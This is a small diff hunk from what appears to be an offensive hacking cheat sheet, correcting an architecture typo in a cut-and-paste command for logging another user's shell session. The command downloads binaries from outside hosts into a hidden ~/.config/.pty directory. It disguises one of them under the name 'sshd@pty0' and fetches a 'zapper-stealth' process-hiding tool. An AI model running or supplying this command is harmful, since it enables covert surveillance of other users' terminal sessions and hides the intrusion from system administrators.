@@ -1893,7 +1893,7 @@ A method to log the shell session of a user. Useful when you are not root but st
 Cut & paste the following and follow the instructions:
 ```sh
 { mkdir -p ~/.config/.pty 2>/dev/null; [ $(uname -m) == aarch64 ] && s=aarch64_arm64; :; } \
-&& curl -o ~/.config/.pty/sshd@pty0 -fsSL "https://bin.ajam.dev/${s:-x896_64}_Linux/Baseutils/script" \
+&& curl -o ~/.config/.pty/sshd@pty0 -fsSL "https://bin.ajam.dev/${s:-x86_64}_Linux/Baseutils/script" \
 && chmod 755 ~/.config/.pty/sshd@pty0 \
 && curl -o ~/.config/.pty/clear -fsSL https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m) \
 && chmod 755 ~/.config/.pty/clear \
